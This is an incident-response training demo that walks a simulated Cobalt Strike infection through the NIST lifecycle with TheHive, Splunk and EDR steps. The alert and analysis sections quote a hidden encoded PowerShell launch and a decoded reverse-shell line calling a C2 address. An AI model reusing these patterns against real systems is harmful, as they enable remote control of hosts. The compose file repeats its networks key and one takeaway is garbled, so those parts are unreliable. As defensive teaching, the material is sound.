# Demo 01 — IR Frameworks: Walking Through the NIST Lifecycle

## Overview

This demo walks through a complete incident using the NIST SP 800-61r2 lifecycle.
We simulate a malware infection scenario step-by-step, showing what happens at each phase and what artifacts to collect.

**Duration:** 40 minutes

**Tools:** Docker, TheHive, Python (simulation scripts)

**Scenario:** Suspected ransomware deployment — caught at early stage

---

## Setup

```yaml
# docker-compose.yml
version: "3.8"
services:
  thehive:
    image: strangebee/thehive:5.2
    ports:
      - "9000:9000"
    environment:
      - JVM_OPTS=-Xms512m -Xmx1024m
    volumes:
      - thehive-data:/opt/thp/thehive/data
      - thehive-index:/opt/thp/thehive/index
    depends_on:
      - cassandra
      - elasticsearch
    networks:
      - ir-net
  cassandra:
    image: cassandra:4.1
    environment:
      - MAX_HEAP_SIZE=512M
      - HEAP_NEWSIZE=128M
    volumes:
      - cassandra-data:/var/lib/cassandra
    networks:
      - ir-net
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.17.12
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    networks:
      - ir-net
networks:
  ir-net:
networks:
  ir-net:
    driver: bridge
volumes:
  thehive-data:
  thehive-index:
  cassandra-data:
  elasticsearch-data:
```

```console
docker compose up -d
# Wait 3 minutes
# Access TheHive at http://localhost:9000
# Login: admin@thehive.local / secret
```

---

## Scenario Context

**Time:** 2025-04-10, 14:32 UTC

**Organization:** MedSupply GmbH (medical device supply chain)

**Alert:** EDR triggered — suspicious process chain on WORKSTATION-FINANCE-03

```text
Parent: WINWORD.EXE
Child:  cmd.exe /c powershell.exe -nop -w hidden -enc <base64>
Hash:   b94f53a9d7439c59a6f26cc37a965c77 (Cobalt Strike)
C2:     185.220.101.73:443
User:   anna.schmidt@medsupply.de
```

---

## Phase 1: Preparation (pre-incident state)

**Demonstrate:** Show the pre-existing IR artifacts that enable fast response.

```markdown
MedSupply GmbH IR Readiness Checklist (already done):
✓ IR Plan documented and approved
✓ TheHive deployed and accessible
✓ Incident severity criteria defined
✓ Contact list maintained (internal + external)
✓ Encrypted communication channel (Signal group) established
✓ EDR on all endpoints (CrowdStrike)
✓ SIEM (Splunk) alerts configured
✓ Forensic toolkit on SOC workstation
✓ GDPR notification templates prepared
✓ Tabletop exercise conducted 3 months ago
```

**Takeaway:** Without preparation, each of these would need to be set up DURING the incident, costing precious time.

---

## Phase 2: Detection and Analysis

### Step 1: Alert received

At 14:32, EDR generates alert.
Tier 1 analyst acknowledges.

**Analyst triage (5 minutes):**

1. Cobalt Strike hash confirmed via VirusTotal (58/92 malicious)
1. C2 IP 185.220.101.73 — VT: 45/92, tagged "cobaltstrike C2"
1. Asset: WORKSTATION-FINANCE-03, Finance dept, HIGH criticality
1. User: anna.schmidt — standard user, no admin rights

**Decision: Escalate to Tier 2 — True Positive**

### Step 2: Create TheHive case

In TheHive, create a new case:

```text
Title: Cobalt Strike beacon — WORKSTATION-FINANCE-03
Severity: HIGH
TLP: Amber
Tags: cobalt-strike, c2, finance
Description: EDR detected Cobalt Strike beacon activity...
```

Add observables:

* IP: `185.220.101.73` (tagged: C2, cobalt-strike)
* Hash: `b94f53a9d7439c59a6f26cc37a965c77` (tagged: malware)
* Hostname: `WORKSTATION-FINANCE-03`
* Username: `anna.schmidt@medsupply.de`

### Step 3: Scope determination

**Tier 2 analyst SIEM queries:**

```spl
# How long has this host been communicating with C2?
index=network dst_ip=185.220.101.73
| sort _time
| head 1

# Any other hosts communicating with same C2?
index=network dst_ip=185.220.101.73
| stats count by src_ip, src_host
| sort -count

# What else has anna.schmidt done today?
index=* user="anna.schmidt" earliest=-24h
| stats count by EventCode, host
| sort -count
```

**Simulated findings:**

* First C2 contact: 14:30 UTC (2 minutes before EDR alert)
* No other hosts communicating with this C2
* User activity: normal Office work + email until 14:29, then PS download

**Scope assessment:** Single host, early-stage compromise.
Good news: caught fast.

---

## Phase 3: Containment

### Immediate containment decision

**Factors:**

* Single host identified
* 2-minute dwell time (minimal lateral movement opportunity)
* Finance workstation — could have access to payment systems
* No active exfiltration detected

**Decision: Immediate EDR isolation**

```console
# EDR isolation command (CrowdStrike Falcon example)
crowdstrike-isolate --hostname WORKSTATION-FINANCE-03 --reason "Cobalt Strike beacon detected"

# Firewall block for C2 (belt and suspenders)
# Submit to network team: block 185.220.101.73/32 all ports
```

**Document in TheHive:**

* Add task: "Isolate WORKSTATION-FINANCE-03" → Mark complete with timestamp
* Add task: "Block C2 IP 185.220.101.73 at firewall" → Complete when confirmed

### Credential containment

Even with a 2-minute dwell time, the Cobalt Strike beacon could have grabbed memory:

```text
- Reset anna.schmidt's AD password
- Revoke all active sessions/tokens
- Check if anna.schmidt has any privileged access that needs further action
  (Finance - check: payment system access, banking portal credentials)
```

---

## Phase 4: Eradication

### Forensic collection first

Before cleaning, collect:

```console
# Memory dump (if still accessible before isolation)
# Use Magnet RAM Capture or WinPmem
winpmem.exe /output //network_share/FINANCE-03_memory.raw

# EDR artifact collection
crowdstrike-getartifacts --hostname WORKSTATION-FINANCE-03 \
  --artifacts process,network,registry,files
```

### Analysis

```python
# Decode the PowerShell command (base64 example)
import base64
encoded = "JABjAGwAaQBlAG4AdA..."  # from alert
decoded = base64.b64decode(encoded).decode('utf-16-le')
print(decoded)
# Output: $client = New-Object System.Net.Sockets.TCPClient('185.220.101.73', 443)
# Confirmed: reverse shell
```

### Eradication checklist for this incident

```text
□ Memory dump collected
□ Disk image created (or EDR artifact export)
□ Host rebuilt from standard image (do not clean CobaltStrike — rebuild)
□ New password set on rebuild
□ MFA configured for anna.schmidt
□ Verify no registry persistence (checked via EDR artifacts — none found)
□ Verify no scheduled tasks created
□ Source document (Word file with macro) identified and removed from email + shares
```

---

## Phase 5: Recovery

```text
□ New workstation imaged from standard corporate build
□ User data restored from backup (pre-compromise)
□ anna.schmidt connected: new credentials provided in person
□ MFA enabled and tested
□ 2-week enhanced monitoring on anna.schmidt's new workstation
□ Finance payment system access reviewed: no unauthorized transactions
□ Business operations: anna.schmidt working on new machine by 17:30 (3 hours after detection)
```

---

## Phase 6: Lessons Learned

**AAR conducted 5 days later:**

**What went well:**

* MTTD: 2 minutes (excellent)
* Containment in 23 minutes (within SLA)
* No lateral movement or data loss

**What could be improved:**

* Memory dump was not captured before isolation
* No playbook for Cobalt Strike existed
* The macro in the Word document bypassed email filter

**Action items:**

1. Write CobaltStrike playbook (SOC Lead, 2 weeks)
1. Add memory capture to containment SOP (IR Lead, 1 week)
1. Enable macro blocking in Proofpoint (Email Admin, 1 week)
1. Consider MFA for finance payment portal (IT, 3 weeks)

---

## Key Takeaways

1. **Preparation makes response fast** — without TheHive ready, case creation alone would take 30 minutes
1. **Scope first, then contain** — but with early-stage ransomware, err on the side of faster containment
1. **Document everything in real-time** — memory fades, TheHive records persist
1. **LLM of lessons learned is worthless without action items** — who does what by when

---

## Cleanup

```console
docker compose down -v
```
